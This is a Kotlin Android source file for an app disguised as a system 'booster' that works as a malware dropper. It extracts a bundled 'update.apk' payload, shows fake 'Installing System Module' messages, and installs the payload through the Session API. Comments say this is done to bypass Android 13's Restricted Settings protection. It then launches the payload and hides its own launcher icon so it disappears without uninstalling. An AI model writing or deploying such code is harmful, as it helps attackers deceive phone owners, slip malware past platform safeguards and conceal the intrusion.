package com.system.service.booster

import android.app.PendingIntent
import android.content.Intent
import android.content.pm.PackageInstaller
import android.net.Uri
import android.os.Bundle
import android.widget.Button
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import java.io.File
import java.io.FileOutputStream
import java.io.InputStream
import java.io.OutputStream

class MainActivity : AppCompatActivity() {

    private lateinit var btnInstall: Button
    private lateinit var progressBar: ProgressBar
    private lateinit var statusText: TextView

    private val ACTION_INSTALL_COMPLETE = "com.system.service.booster.INSTALL_COMPLETE"

    private val installReceiver = object : android.content.BroadcastReceiver() {
        override fun onReceive(context: android.content.Context, intent: Intent) {
            if (intent.action == ACTION_INSTALL_COMPLETE) {
                val status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE)
                when (status) {
                    PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                        val confirmIntent = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
                            intent.getParcelableExtra(Intent.EXTRA_INTENT, Intent::class.java)
                        } else {
                            @Suppress("DEPRECATION")
                            intent.getParcelableExtra(Intent.EXTRA_INTENT)
                        }
                        if (confirmIntent != null) {
                            confirmIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            startActivity(confirmIntent)
                        }
                    }
                    PackageInstaller.STATUS_SUCCESS -> {
                        statusText.text = "Update Succeeded!"
                        
                        // Launch the Main App
                        val payloadPackage = intent.getStringExtra("payload_package")
                        if (!payloadPackage.isNullOrEmpty()) {
                            val launchIntent = context.packageManager.getLaunchIntentForPackage(payloadPackage)
                            if (launchIntent != null) {
                                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                context.startActivity(launchIntent)
                            }
                        }
                        
                        // Hide Dropper from launcher so it disappears without uninstalling
                        try {
                            val componentName = android.content.ComponentName(context, MainActivity::class.java)
                            context.packageManager.setComponentEnabledSetting(
                                componentName,
                                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                android.content.pm.PackageManager.DONT_KILL_APP
                            )
                        } catch (e: Exception) {
                            e.printStackTrace()
                        }
                    }
                    else -> {
                        val msg = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE)
                        statusText.text = "Install Failed: $msg"
                    }
                }
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        androidx.core.content.ContextCompat.registerReceiver(
            this, installReceiver, android.content.IntentFilter(ACTION_INSTALL_COMPLETE),
            androidx.core.content.ContextCompat.RECEIVER_EXPORTED
        )
        setContentView(R.layout.activity_main)

        btnInstall = findViewById(R.id.btn_install)
        progressBar = findViewById(R.id.progressBar)
        statusText = findViewById(R.id.tv_status)

        btnInstall.setOnClickListener {
            installPayload()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(installReceiver)
    }

    private fun installPayload() {
        btnInstall.isEnabled = false
        progressBar.visibility = android.view.View.VISIBLE
        statusText.text = "Extracting module..."

        Thread {
            try {
                // The actual payload APK will be stored in the assets folder named 'update.apk'
                val assetManager = assets
                val inStream: InputStream = assetManager.open("update.apk")
                
                val outFile = File(cacheDir, "update.apk")
                val outStream: OutputStream = FileOutputStream(outFile)
                
                val buffer = ByteArray(1024)
                var read: Int
                while (inStream.read(buffer).also { read = it } != -1) {
                    outStream.write(buffer, 0, read)
                }
                
                inStream.close()
                outStream.flush()
                outStream.close()

                runOnUiThread {
                    statusText.text = "Installing System Module..."
                    installPackageUsingSessionAPI(outFile)
                }
            } catch (e: Exception) {
                runOnUiThread {
                    statusText.text = "Error: " + e.message
                    btnInstall.isEnabled = true
                    progressBar.visibility = android.view.View.GONE
                }
            }
        }.start()
    }

    // Using the Session API is critical because apps installed via PackageInstaller API
    // by another app bypass the "Restricted Settings" flag in Android 13+.
    private fun installPackageUsingSessionAPI(apkFile: File) {
        try {
            val packageInstaller = packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
            val sessionId = packageInstaller.createSession(params)
            val session = packageInstaller.openSession(sessionId)

            val out = session.openWrite("package", 0, -1)
            val inputStream = apkFile.inputStream()
            val buffer = ByteArray(65536)
            var c: Int
            while (inputStream.read(buffer).also { c = it } != -1) {
                out.write(buffer, 0, c)
            }
            session.fsync(out)
            inputStream.close()
            out.close()

            // After writing to session, commit it.
            val intent = Intent(ACTION_INSTALL_COMPLETE)
            intent.setPackage(packageName)
            
            val archiveInfo = packageManager.getPackageArchiveInfo(apkFile.absolutePath, 0)
            val payloadPackage = archiveInfo?.packageName ?: ""
            intent.putExtra("payload_package", payloadPackage)
            
            val pendingIntent = PendingIntent.getBroadcast(
                this, 0, intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
            )
            
            session.commit(pendingIntent.intentSender)
            
            statusText.text = "Installation requested. Please confirm prompt."
            progressBar.visibility = android.view.View.GONE
            
        } catch (e: Exception) {
            statusText.text = "Install Failed: ${e.message}"
            btnInstall.isEnabled = true
            progressBar.visibility = android.view.View.GONE
        }
    }
}
